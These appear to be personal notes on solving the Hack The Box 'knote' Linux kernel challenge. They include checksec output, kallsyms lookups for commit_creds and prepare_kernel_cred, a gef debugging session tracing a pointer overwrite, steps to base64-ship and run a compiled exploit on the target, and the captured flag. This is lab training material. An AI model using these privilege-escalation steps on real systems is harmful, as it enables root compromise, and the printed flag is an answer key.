#https://7rocky.github.io/en/ctf/htb-challenges/pwn/knote/
#https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/

'''
init
setsid cttyhack setuidgid 0 /bin/sh #add this line to see the symbol addresses
cttyhack su -s /bin/sh user

checksec --file vmlinux
[*] '/root/github/htb/ctf/pwn/knote/debug/vmlinux'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0xffffffff81000000)
    RWX:      Has RWX segments

/home/user # grep -E 'prepare_kernel_cred|commit_creds' /proc/kallsyms
ffffffff81053a30 T commit_creds
ffffffff81053c50 T prepare_kernel_cred
ffffffff816cd674 r __ksymtab_commit_creds
ffffffff816d110c r __ksymtab_prepare_kernel_cred
ffffffff816d78b4 r __kstrtabns_commit_creds
ffffffff816d78b4 r __kstrtabns_prepare_kernel_cred
ffffffff816d8e22 r __kstrtab_commit_creds
ffffffff816d8e62 r __kstrtab_prepare_kernel_cred
/home/user # grep knote /proc/kallsyms
ffffffffa0000040 t knote_ioctl  [knote]
ffffffffa0002100 d knote_ioctl_lock     [knote]
ffffffffa0002000 d knote_fops   [knote]
ffffffffa0002418 b major        [knote]
ffffffffa0002410 b __key.26552  [knote]
ffffffffa0002410 b knote_class  [knote]
ffffffffa0001074 r _note_7      [knote]
ffffffffa00023c0 b knotes       [knote]
ffffffffa0002140 d __this_module        [knote]
ffffffffa0000020 t knote_decrypt        [knote]
ffffffffa0000000 t knote_encrypt        [knote]

$ sh go.sh
$ gdb -q vmlinux
Reading symbols from vmlinux...
(No debugging symbols found in vmlinux)
gef➤  gef-remote localhost 1234
0xffffffff810177c5 in ?? ()
[!] Command 'gef-remote' failed to execute properly, reason: Remote I/O error: Function not implemented

gef➤  grep asdf
[+] Searching 'asdf' in memory
[+] In (0x400000-0x405000), permission=r--
  0x40308d - 0x403091  →   "asdf"
  0x40408d - 0x404091  →   "asdf"
[+] In (0xffff88800009b000-0xffff888001000000), permission=rw-
  0xffff8880003e008d - 0xffff8880003e0091  →   "asdf"
[+] In (0xffff8880018d2000-0xffff88800750b000), permission=rw-
  0xffff8880074b6d98 - 0xffff8880074b6d9c  →   "asdf[...]"
gef➤  grep 0xffff8880074b6d98
[+] Searching '\x98\x6d\x4b\x07\x80\x88\xff\xff' in memory
[+] In (0xffff888000000000-0xffff888000099000), permission=rw-
  0xffff888000093c00 - 0xffff888000093c20  →   "\x98\x6d\x4b\x07\x80\x88\xff\xff[...]"
[+] In (0xffff888007514000-0xffff888007fe0000), permission=rw-
  0xffff888007f33040 - 0xffff888007f33060  →   "\x98\x6d\x4b\x07\x80\x88\xff\xff[...]"
gef➤  x/4gx 0xffff888000093c00
0xffff888000093c00:     0xffff8880074b6d98      0x0000000000000004
0xffff888000093c10:     0xffffffffa0000000      0xffffffffa0000020
gef➤  grep continue
Continuing.

gef➤  x/4gx 0xffff888000093c00
0xffff888000093c00:     0xffff88800008c290      0x0000000000000010
0xffff888000093c10:     0xffffffffa0000000      0xffffffffa0000020
gef➤  x/s 0xffff88800008c290
0xffff88800008c290:     "fdsafdsafdsafdsa.init.text"

"fdsafdsafdsafdsa" is stored in the current structure (overwriting the pointer to "asdf")

x86_64-linux-musl-gcc -o solve -static ../solve.c
gzip solve
cat solve.gz | base64 > output.txt

edit output.txt add echo and >> b64

cat b64|base64 -d > e.gz
gunzip e.gz
chmod +x e
./e

paste all the command one time

cat /flag
HTB{2cdbf36398470b5428ea991d18502ef2}
'''
